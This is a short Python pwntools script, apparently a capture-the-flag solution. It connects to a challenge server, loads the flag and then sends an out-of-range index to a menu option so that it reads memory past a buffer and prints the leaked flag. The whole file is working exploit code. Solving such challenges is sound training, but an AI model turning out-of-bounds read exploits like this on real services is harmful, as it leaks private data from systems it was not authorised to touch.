from pwn import *

host = 'play.scriptsorcerers.xyz'
port = 10014

io = remote(host, port)

# read flag
io.sendline(b'1337')

io.recvuntil(b'Exit')
# leak flag
io.sendline(b'2')
# nums towards to flag buffer is 64 bytes length
io.sendlineafter(b'Index: ', b'8')

io.recvuntil(b'Data: ')

print(io.recvline())
